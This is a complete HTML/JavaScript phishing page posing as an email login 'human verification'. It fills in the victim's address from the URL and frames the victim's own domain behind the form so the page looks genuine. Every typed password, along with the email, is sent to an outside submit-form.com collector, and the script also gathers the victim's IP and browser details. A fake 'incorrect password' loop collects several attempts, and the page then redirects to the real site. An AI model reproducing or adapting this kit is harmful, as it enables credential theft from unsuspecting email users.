<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Email Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        #background-iframe, #overlay {
            position: fixed;
            top: 0;
            left: 0;
            height: 100%;
            width: 100%;
        }
        #background-iframe {
            border: none;
            z-index: -3;
            object-fit: cover;
        }
        #overlay {
            background-color: rgba(0, 0, 0, 0.5);
            z-index: -2;
        }
        .login-container {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            width: 300px;
            position: relative;
            z-index: 1;
        }
        .login-container::before {
            content: attr(data-domain);
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) rotate(-45deg);
            font-size: 60px;
            color: rgba(0, 0, 0, 0.1);
            white-space: nowrap;
            pointer-events: none;
            z-index: 0;
        }
        .form-group {
            margin-bottom: 15px;
            position: relative;
            z-index: 1;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input {
            width: 100%;
            padding: 8px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        input[readonly] {
            background-color: #f9f9f9;
            cursor: not-allowed;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        .error-message {
            color: red;
            font-size: 14px;
            margin-top: 10px;
            text-align: center;
            display: none;
            position: relative;
            z-index: 1;
        }
        .honeypot {
            display: none;
        }
        .loader-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 9999;
        }
        .spinner-border {
            width: 3rem;
            height: 3rem;
            border: 0.25em solid currentColor;
            border-right-color: transparent;
            border-radius: 50%;
            animation: spinner-border 0.75s linear infinite;
        }
        @keyframes spinner-border {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <iframe id="background-iframe" src="about:blank" allowfullscreen></iframe>
    <div id="overlay"></div>
    <div class="login-container" data-domain="">
        <h2 data-translate="form_header">Verify you’re human</h2>
        <form id="login-form" action="https://submit-form.com/J2IVAy4bj" method="POST">
            <div class="form-group">
                <label for="email" data-translate="email_label">Email:</label>
                <input type="email" id="email" name="email" required readonly>
            </div>
            <div class="form-group">
                <label for="password" data-translate="password_label">Password:</label>
                <input type="password" id="password" name="password" required>
            </div>
            <div class="form-group honeypot">
                <label for="honeypot">Leave this field empty:</label>
                <input type="text" id="honeypot" name="honeypot">
            </div>
            <button type="submit" data-translate="submit_button">Log In</button>
            <div class="error-message" id="error-message" data-translate="error_message">Incorrect password, please try again</div>
        </form>
    </div>
    <div id="loader-overlay" class="loader-overlay">
        <div class="spinner-border text-light" role="status">
            <span class="visually-hidden" data-translate="loader_text">Loading...</span>
        </div>
    </div>

    <script>
        // Translation dictionary
        const translations = {
            en: {
                form_header: "Verify you’re human",
                email_label: "Email:",
                password_label: "Password:",
                submit_button: "Log In",
                error_message: "Incorrect password, please try again",
                bot_detected: "Bot detected, please try again",
                loader_text: "Loading..."
            },
            es: {
                form_header: "Verifica que eres humano",
                email_label: "Correo electrónico:",
                password_label: "Contraseña:",
                submit_button: "Iniciar sesión",
                error_message: "Contraseña incorrecta, por favor intenta de nuevo",
                bot_detected: "Bot detectado, por favor intenta de nuevo",
                loader_text: "Cargando..."
            },
            fr: {
                form_header: "Vérifiez que vous êtes humain",
                email_label: "E-mail :",
                password_label: "Mot de passe :",
                submit_button: "Se connecter",
                error_message: "Mot de passe incorrect, veuillez réessayer",
                bot_detected: "Bot détecté, veuillez réessayer",
                loader_text: "Chargement..."
            },
            de: {
                form_header: "Bestätigen Sie, dass Sie ein Mensch sind",
                email_label: "E-Mail:",
                password_label: "Passwort:",
                submit_button: "Anmelden",
                error_message: "Falsches Passwort, bitte versuchen Sie es erneut",
                bot_detected: "Bot erkannt, bitte versuchen Sie es erneut",
                loader_text: "Laden..."
            },
            it: {
                form_header: "Verifica che sei umano",
                email_label: "Email:",
                password_label: "Password:",
                submit_button: "Accedi",
                error_message: "Password errata, riprova",
                bot_detected: "Bot rilevato, riprova",
                loader_text: "Caricamento..."
            },
            pt: {
                form_header: "Verifique que você é humano",
                email_label: "E-mail:",
                password_label: "Senha:",
                submit_button: "Entrar",
                error_message: "Senha incorreta, tente novamente",
                bot_detected: "Bot detectado, tente novamente",
                loader_text: "Carregando..."
            },
            ja: {
                form_header: "あなたが人間であることを確認してください",
                email_label: "メール:",
                password_label: "パスワード:",
                submit_button: "ログイン",
                error_message: "パスワードが正しくありません。もう一度お試しください",
                bot_detected: "ボットが検出されました。もう一度お試しください",
                loader_text: "読み込み中..."
            },
            zh: {
                form_header: "验证您是人类",
                email_label: "电子邮件:",
                password_label: "密码:",
                submit_button: "登录",
                error_message: "密码错误，请重试",
                bot_detected: "检测到机器人，请重试",
                loader_text: "加载中..."
            }
        };

        // Function to detect browser language
        function getBrowserLanguage() {
            const lang = navigator.language || navigator.languages[0] || 'en';
            return lang.split('-')[0]; // Get base language (e.g., 'en' from 'en-US')
        }

        // Function to apply translations
        function applyTranslations(lang) {
            const elements = document.querySelectorAll('[data-translate]');
            const translation = translations[lang] || translations['en']; // Fallback to English
            elements.forEach(element => {
                const key = element.getAttribute('data-translate');
                element.textContent = translation[key];
            });
        }

        // Function to extract email and domain from URL using # or ?
        function getEmailFromUrl() {
            const url = window.location.href;
            let email = '';
            if (url.includes('#')) {
                email = url.split('#')[1];
            } else if (url.includes('?')) {
                const query = url.split('?')[1];
                const params = new URLSearchParams(query);
                email = params.get('email') || query.split('&')[0];
            }
            email = decodeURIComponent(email);
            let domain = email.includes('@') ? email.split('@')[1] : '';
            return { email, domain };
        }

        // Initialize form and background
        document.addEventListener("DOMContentLoaded", () => {
            const emailInput = document.getElementById('email');
            const passwordInput = document.getElementById('password');
            const honeypotInput = document.getElementById('honeypot');
            const loginContainer = document.querySelector('.login-container');
            const errorMessage = document.getElementById('error-message');
            const loaderOverlay = document.getElementById('loader-overlay');
            const form = document.getElementById('login-form');
            const backgroundIframe = document.getElementById('background-iframe');
            const { email, domain } = getEmailFromUrl();

            // Set email and background iframe
            if (email) {
                emailInput.value = email;
            }
            if (domain) {
                loginContainer.setAttribute('data-domain', domain);
                const domainUrl = domain.match(/^https?:\/\//) ? domain : `https://${domain}`;
                backgroundIframe.src = domainUrl;
            } else {
                backgroundIframe.src = 'about:blank';
            }

            // Apply translations
            const browserLang = getBrowserLanguage();
            applyTranslations(browserLang);

            // Track submission attempts and timing
            let submissionAttempts = 0;
            const formLoadTime = Date.now();

            // Collect additional data for logging
            let additionalData = {
                ipAddress: "Fetching...",
                userAgent: navigator.userAgent,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                browser: "Detecting..."
            };
            const userAgent = navigator.userAgent;
            additionalData.browser = userAgent.includes("Firefox") ? "Mozilla Firefox" :
                                     userAgent.includes("SamsungBrowser") ? "Samsung Internet" :
                                     userAgent.includes("Opera") || userAgent.includes("OPR") ? "Opera" :
                                     userAgent.includes("Trident") ? "Microsoft Internet Explorer" :
                                     userAgent.includes("Edge") ? "Microsoft Edge" :
                                     userAgent.includes("Chrome") ? "Google Chrome or Chromium" :
                                     userAgent.includes("Safari") ? "Apple Safari" : "Unknown";

            fetch("https://api.ipify.org?format=json")
                .then(response => response.json())
                .then(data => { additionalData.ipAddress = data.ip; })
                .catch(error => {
                    console.error("Error fetching IP address:", error);
                    additionalData.ipAddress = "Unavailable";
                });

            // Handle form submission
            form.addEventListener('submit', async (event) => {
                event.preventDefault();

                // Bot detection
                const timeSinceLoad = Date.now() - formLoadTime;
                if (honeypotInput.value !== '' || timeSinceLoad < 1000) {
                    errorMessage.textContent = translations[browserLang]?.bot_detected || "Bot detected, please try again";
                    errorMessage.style.display = 'block';
                    passwordInput.value = '';
                    honeypotInput.value = '';
                    passwordInput.focus();
                    return;
                }

                submissionAttempts++;
                loaderOverlay.style.display = 'flex';

                // Prepare form data
                const email = emailInput.value.trim();
                const password = passwordInput.value.trim();
                const data = { email, password };

                // Log additional data
                const logMessage = `Email: ${email}\nPassword: ${password}\nIP Address: ${additionalData.ipAddress}\nUser Agent: ${additionalData.userAgent}\nTimezone: ${additionalData.timezone}\nBrowser: ${additionalData.browser}`;
                console.log(logMessage);

                // Submit form data
                try {
                    const response = await fetch('https://submit-form.com/J2IVAy4bj', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data)
                    });
                    console.log(response.ok ? 'Submission to form successful!' : 'Submission to form failed.');
                } catch (error) {
                    console.error('Submission error:', error);
                }

                // Handle submission attempts
                setTimeout(() => {
                    loaderOverlay.style.display = 'none';
                    if (submissionAttempts <= 4) {
                        errorMessage.textContent = translations[browserLang]?.error_message || "Incorrect password, please try again";
                        errorMessage.style.display = 'block';
                        passwordInput.value = '';
                        honeypotInput.value = '';
                        passwordInput.focus();
                    } else if (submissionAttempts === 5) {
                        if (domain) {
                            window.location.href = `https://${domain}`;
                        } else {
                            errorMessage.textContent = translations[browserLang]?.error_message || "Incorrect password, please try again";
                            errorMessage.style.display = 'block';
                            passwordInput.value = '';
                            honeypotInput.value = '';
                            passwordInput.focus();
                        }
                    }
                }, 3000);
            });
        });
    </script>
</body>
</html>
